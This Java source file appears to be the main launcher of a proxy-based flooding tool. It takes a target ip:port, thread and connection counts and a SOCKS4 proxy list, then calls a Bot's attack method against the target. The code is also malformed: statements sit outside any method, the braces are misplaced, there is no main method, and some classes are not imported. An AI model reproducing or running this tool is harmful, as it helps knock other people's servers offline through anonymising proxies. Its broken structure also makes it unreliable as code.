//
// Todos los derechos reservados a Daniel.Arvizu.Rosselli
//
package me.kurumifake.zadkiel;

import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.Socket;
import java.net.URL;
import me.kurumifake.zadkiel.Proxies;
import me.kurumifake.zadkiel.ProxiesGetter;
import me.kurumifake.zadkiel.RandomOptions;
import me.kurumifake.zadkiel.Options.options;

public class MenuPrincipal {
    private static Proxies proxies;
    }
    System.out.println("<ip:port> <threads> <connections> <proxies file>");
    ProxiesGetter.downloadFile(proxies);
    if (args.length != 4)
        return;
    String ip = args[0].split(":")[0];
    int port = Integer.parseInt(args[0].split(":")[1]);
    int threads = Integer.parseInt(args[1]);
    int connections = Integer.parseInt(args[2]);
    String proxy = args[3];
    try {
        ProxyManager proxyManager = new ProxyManager();
        if (proxyManager.loadProxy(proxy)) {
            Bot botAttack = new Bot(ip, port, proxyManager);
            botAttack.attack(threads, connections);
        } else {
            System.out.println("make sure to put valid socks4 proxies");
        }

        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }
    }
}